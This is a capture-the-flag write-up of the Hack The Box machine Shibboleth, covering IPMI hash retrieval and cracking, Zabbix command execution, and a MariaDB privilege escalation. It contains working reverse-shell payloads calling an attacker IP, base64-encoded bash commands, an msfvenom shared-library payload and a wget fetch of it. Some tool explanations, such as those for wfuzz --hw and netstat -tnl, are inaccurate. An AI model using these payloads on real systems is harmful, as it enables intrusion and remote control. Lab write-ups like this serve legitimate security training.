---
description: https://app.hackthebox.com/machines/410
---

# 👁️ Shibboleth

<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

After a quick nmap, we only find port 80 open, after a better look:

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

looking at the webserver:

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

We see some bootstrap, maybe this box has a CVE related exploit ->

we also are able to pull some possible usernames:

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

I also find at the end of the page some possible backend technologies that could be our entry point&#x20;

<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```
wfuzz -u http://shibboleth.htb -H "Host: FUZZ.shibboleth.htb" -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt --hw 26

```

in a previous scan, we noted that all pages that returned a 302 had 26 words so the `--hw` flag is used to specify the header word to match in the response, in this case, it is set to `26`, which means the attack will stop when the response header contains the word `26`

<figure><img src="../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

there is a zabbix subdomain, so it's probably the way to go, we need to add those in the etc/hosts file

a good thing to do after that is to launch a feroxbuster:

```
feroxbuster -u http://shibboleth.htb -w /usr/share/SecLists/Discovery/Web-Content/raft-medium-directories.txt
```

`feroxbuster`, which is a tool for web application enumeration. The command is performing a directory bruteforce attack on the target URL `http://shibboleth.htb` with the wordlist `/usr/share/SecLists/Discovery/Web-Content/raft-medium-directories.txt`. The `-w` flag is used to specify the wordlist file

<figure><img src="../../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

nothing very interesting

The subdomains we found earlier all redirect to this page:

<figure><img src="../../.gitbook/assets/image (8) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

tried default creds but it did not work:

<figure><img src="../../.gitbook/assets/image (9) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

let's try to find other ways of going for the moment:

<figure><img src="../../.gitbook/assets/image (10) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p>bare metal bmc automation exploit</p></figcaption></figure>

interesting, zabbix was maybe a rabbit hole

we can see that default port is 623, let's check:

<figure><img src="../../.gitbook/assets/image (11) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

We have to be extremly careful because when we type in this command:

```
nmap -sCV -p 623 10.129.30.233
```

<figure><img src="../../.gitbook/assets/image (12) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

but if we type in this command

```
nmap -sU -p 623 -sCV shibboleth.htb
```

<figure><img src="../../.gitbook/assets/image (13) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

the `-sU` flag is used to specify the scan type as a UDP scan.

The target may be running a service on port `623` using the UDP protocol, but not using the TCP protocol.

The target may have a firewall configured to block incoming TCP connections on port `623`, but not UDP connections.

Let's follow the hacktricks methods to enumerate:

**identify** the **version** using:

```
#On msfconsole
use auxiliary/scanner/ipmi/ipmi_version
#or
nmap -sU --script ipmi-version -p 623 IP_Target
```

the nmap made this output:

<figure><img src="../../.gitbook/assets/image (14) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

and the msfconsole:

<figure><img src="../../.gitbook/assets/image (15) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

I followed the **IPMI 2.0 RAKP Authentication Remote Password Hash Retrieval** path and tried out this exploit:

<figure><img src="../../.gitbook/assets/image (17) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

I just had to set rhosts and it retrieved this:

<figure><img src="../../.gitbook/assets/image (16) (1) (1) (1).png" alt=""><figcaption><p>Script kiddie stuff...</p></figcaption></figure>

now let's find the type of hash:

<figure><img src="../../.gitbook/assets/image (18) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

So the hashcat command would look like:

```
hashcat -m 7300 adminhash.txt /usr/share/wordlists/rockyou.txt --user
```

using the `--user` flag because the hash starts with the username

<figure><img src="../../.gitbook/assets/image (19) (1) (1).png" alt=""><figcaption></figcaption></figure>

We arrive on this dashboard:&#x20;

<figure><img src="../../.gitbook/assets/image (20) (1) (1).png" alt=""><figcaption></figcaption></figure>

after some enumeration, we find this:&#x20;

<figure><img src="../../.gitbook/assets/image (21) (1) (1).png" alt=""><figcaption></figcaption></figure>

Top right of the screen there is a create item button, let's see:

<figure><img src="../../.gitbook/assets/image (22) (1) (1).png" alt=""><figcaption></figcaption></figure>

put whatever for the name and type `system.run[id]` for the key

<figure><img src="../../.gitbook/assets/image (23) (1) (1).png" alt=""><figcaption></figcaption></figure>

Then click the test button and the get value, it will output the `id` command so we got a RCE

So we can try a reverse shell that we double encode to bypass any errors or special character problems:

```
echo "bash -i >& /dev/tcp/10.10.14.94/9898 0>&1 " | base64
```

Let's try only base64 for now:

<figure><img src="../../.gitbook/assets/image (24) (1) (1).png" alt=""><figcaption><p>YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC45NC85ODk4IDA+JjEgCg</p></figcaption></figure>

It did not work, the fact that we have some + in the command bothers me so if we add some double spaces in between each one of the spaces:

```
echo "bash  -i  >&  /dev/tcp/10.10.14.166/9898  0>&1  " | base64
```

so in the key parameter:

```
system.run[echo YmFzaCAgLWkgID4mICAvZGV2L3RjcC8xMC4xMC4xNC4xNjYvOTg5OCAgMD4mMSAgCg | base64 | bash]
```

the final version of the payload was with port 443 so:

```
YmFzaCAgLWkgID4mICAvZGV2L3RjcC8xMC4xMC4xNC4xNjYvOTg5OCAgMD4mMSAgCg
```

and the RCE parameter was:

```
system.run[echo  YmFzaCAgLWkgID4mICAvZGV2L3RjcC8xMC4xMC4xNC45NC80NDMgMD4mMSAgCg | base64 -d | bash]
```

set up a listener, click on test then get value:

<figure><img src="../../.gitbook/assets/image (25) (1).png" alt=""><figcaption></figcaption></figure>

we get some type of timeout&#x20;

while looking through the documentation about how I could stabilize the shell or make a command that would create a new shell, we saw how the command system.run really works:

<figure><img src="../../.gitbook/assets/image (31).png" alt=""><figcaption></figcaption></figure>

So if we have a timeout after waiting for the end of the execution, let's see with the `nowait` parameter

```
system.run[echo  YmFzaCAgLWkgID4mICAvZGV2L3RjcC8xMC4xMC4xNC4xNjYvOTg5OCAgMD4mMSAgCg  | base64 -d | bash, nowait]
```

I get a persistent shell but can't access the user.txt&#x20;

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

after being a bit stuck, I saw that I was not logged in as the user who had the flag, so I tried to log in with the zabbix password found earlier and it worked:

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

after a bit of looking around, we found something that could be the way to go:

```
netstat -tnl
```

<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

When you run the `netstat -tnl` command, you will see a list of the current TCP and UDP connections on your system, along with their local and remote addresses and the state of the connections. This can be useful for identifying which processes are listening on which ports, and for troubleshooting network connectivity issues.

{% embed url="https://www.ionos.fr/digitalguide/serveur/outils/introduction-a-netstat/" %}

10050 and 10051 are [Zabbix-related](https://www.zabbix.com/forum/zabbix-help/47241-zabbix-agent-and-server-ports). 80 is the web stuff. 3306 is MySQL, which also [supports Zabbix](https://www.zabbix.com/documentation/current/en/manual/appendix/install/db\_scripts)

So after looking around for possible MYSQL creds, I found this directory

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```
cat zabbix_server.conf | grep -v "^#" | grep .
```

the command `cat zabbix_server.conf | grep -v "^#" | grep .` is used to display the non-comment, non-blank lines from the `zabbix_server.conf` file. This can be useful for viewing the active configuration settings in the file.

`grep -v "^#"`: The `grep` command is used to search for and filter lines in the input. The `-v` option is used to invert the search, so that only lines that do not match the specified pattern are displayed. The pattern `"^#"` matches lines that begin with the `#` character, which are typically used for comments in configuration files. This command filters out the lines that are comments, so that only the non-comment lines are displayed.

`grep .`: The `grep` command is used again to search for and filter lines in the input. The `.` character is used as a pattern to match any non-empty line. This command filters out the blank lines, so that only the lines that contain text are displayed.

<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p>bloooarskybluh</p></figcaption></figure>

We found credentials -> let's try to connect to the mysql interface:

```
mysql -u zabbix -pbloooarskybluh
```

the shell does not give us anything it's pending, so I thought about upgrading it:

```
python -c 'import pty; pty.spawn("/bin/bash")'
```

This command uses the Python interpreter to spawn a new Bash shell with a pseudo-terminal (PTY) attached to it. The PTY provides a more interactive and functional shell environment

it did not seem to work so i disconnected and came back to this normal shell:

```
zabbix@shibboleth:/$
```

and upgraded it using the standard `script` trick:

```
script /dev/null -c bash
ctrl+z
stty raw -echo; fg
```

<figure><img src="../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

do the switch user again and try connecting via MySQL

<figure><img src="../../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p>bingow</p></figcaption></figure>

Let's see what's inside this databse:

```
show databases;
```

<figure><img src="../../.gitbook/assets/image (8) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

In the Screenshot above we can see the version of the database, let's look that up ->

<figure><img src="../../.gitbook/assets/image (9) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

I'll go and follow the methodology ->

<figure><img src="../../.gitbook/assets/image (10) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.166 LPORT=9898 -f elf-so -o CVE-2021-27928.so
```

<figure><img src="../../.gitbook/assets/image (11) (1) (1) (1) (1).png" alt=""><figcaption><p>and then open up a python server</p></figcaption></figure>

exit the DB to go back on the shell ->

```
wget http://10.10.14.166:8989/CVE-2021-27928.so
```

<figure><img src="../../.gitbook/assets/image (12) (1) (1) (1).png" alt=""><figcaption><p>i changed the name of the exploit to rev.so</p></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (13) (1).png" alt=""><figcaption></figcaption></figure>

and if you set up your listener earlier ->

<figure><img src="../../.gitbook/assets/image (14) (1).png" alt=""><figcaption></figcaption></figure>

the shell is ugly so let's see what we've learned earlier about making it better ->

<figure><img src="../../.gitbook/assets/image (15) (1).png" alt=""><figcaption></figcaption></figure>

once the shell is nice ->

<figure><img src="../../.gitbook/assets/image (16) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (17) (1).png" alt=""><figcaption><p>bingo</p></figcaption></figure>
